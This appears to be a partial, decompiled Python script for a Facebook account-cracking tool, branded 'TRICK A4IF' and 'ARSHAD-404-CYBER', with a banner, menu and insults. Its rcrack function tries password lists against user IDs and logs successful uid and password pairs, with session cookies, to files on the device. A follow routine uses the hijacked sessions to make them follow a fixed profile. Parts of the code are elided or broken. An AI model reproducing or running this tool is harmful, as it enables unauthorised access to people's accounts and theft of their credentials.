#Fuck TRICK A4IF Snigdo Abal
#Dec By TRICK A4IF
#TRICK A4IF Your Reyal Pappa
...
def saiya():
    ...
    if opt == '1':
        menu()
    if None == '2':
        os.system('xdg-open https://facebook.com/groups/tricka4if/')
        return None
    if None == '0':
        os.system('exit')
        return None
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100080926477096', {
...
logo =("""\033[1;32m
  _______ _____  _____ _____ _  __         _  _ _____ ______ 
 |__   __|  __ \|_   _/ ____| |/ /     /\ | || |_   _|  ____|
    ...
    |_|  |_|  \_\_____\_____|_|\_\ /_/    \_\|_|_____|_|     
       ...
       ┌━━━━━━━━━━━━━━━━━ ARSHAD ━━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  TRICK A4SHAD            
               \033[1;91mFACEBOK      :  TRICK A4SHAD             
               \033[1;97mGITHUB       :  ARSHAD-404-CYBER       
               \033[1;91mSTATUS       :   PREMIUM           
               \033[1;97mTEAM         :  TRICK A4IF                 
...
try:
    ...
    open('.prox.txt','w').write(prox)
	  ...
	  print('WELCOME TO ARSHAD-404-CYBER TOOLS🔥')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\r\033[1;37m[TRICK A4IF\033[1;37m]  [%s/%s]  OK-%s'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[TRICK A4IF-OK🔥] '+uid+ ' | ' +ps+ ' \n\033[1;37m[\033[38;5;46mCOOKIE🎁\033[38;5;196m=\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/TRICK A4IF-FREE-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[TRICK A4IF-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/TRICK A4IF-FREE-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
